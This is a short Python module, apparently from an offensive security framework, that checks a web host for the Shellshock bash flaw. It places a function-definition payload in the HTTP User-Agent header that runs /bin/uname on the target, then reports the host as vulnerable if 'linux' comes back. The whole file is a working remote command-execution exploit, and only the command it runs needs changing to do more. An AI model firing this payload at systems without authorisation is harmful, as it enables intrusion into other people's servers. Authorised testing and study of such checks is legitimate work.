import urllib.request as ur
from jframework.modules.model import Module


class Shellshock_http(Module):

    def run(self):
        ur.FancyURLopener.version = '() { :;}; echo "Content-Type: text/plain"; echo; /bin/uname'
        opener = ur.FancyURLopener({})
        try:
            response = opener.open("http://"+self.host)
            if "linux" in response.read().decode("utf-8").lower():
                print("Vulnerable")
            else:
                print("No vulnerable")
        except Exception as e:
            print(e)